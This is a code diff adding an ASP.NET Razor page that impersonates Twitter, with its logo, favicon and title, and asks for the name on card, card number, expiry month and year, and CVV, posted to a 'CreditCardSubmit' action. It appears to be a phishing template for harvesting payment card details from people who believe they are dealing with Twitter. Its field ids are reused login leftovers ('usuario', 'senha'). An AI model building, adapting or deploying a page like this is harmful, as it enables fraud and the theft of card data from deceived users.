@@ -1,0 +1,57 @@
+﻿@{
+    Layout = null;
+}
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Twitter - Credit Card</title>
+    <link href="~/assets/twitter/css/style.css" rel="stylesheet" />
+    <!--FAVICON-->
+    <link rel="icon" type="image/png" href="~/assets/twitter/img/twitter-logo.png">
+</head>
+
+<body>
+    <header class="container">
+        <div class="logo">
+            <img src="~/assets/twitter/img/twitter-logo.png" alt="Twitter Login">
+        </div>
+    </header>
+
+    <main class="container">
+        <h1>Credit Card Info</h1>
+        <div class="container">
+            <form asp-action="CreditCardSubmit" method="post">
+                <div class="inputs">
+                    <label class="usuario" for="usuario">
+                        Name on Card
+                    </label><br>
+                    <input type="text" id="usuario" required>
+                </div>
+                <div class="inputs">
+                    <label class="senha" for="senha">Credit Card Number</label><br>
+                    <input type="text" id="senha" required>
+                </div>
+                <div class="inputs">
+                    <label class="senha" for="senha">Month</label><br>
+                    <input type="text" id="senha" minlength="2" maxlength="2" required>
+                </div>
+                <div class="inputs">
+                    <label class="senha" for="senha">Year</label><br>
+                    <input type="text" id="senha" minlength="4" maxlength="4" required>
+                </div>
+                <div class="inputs">
+                    <label class="senha" for="senha">CVV</label><br>
+                    <input type="text" id="senha" minlength="3" maxlength="3" required>
+                </div>
+                <br>
+                <button class="button" type="submit">Submit</button>
+            </form>
+        </div>
+    </main>
+</body>
+
+</html>
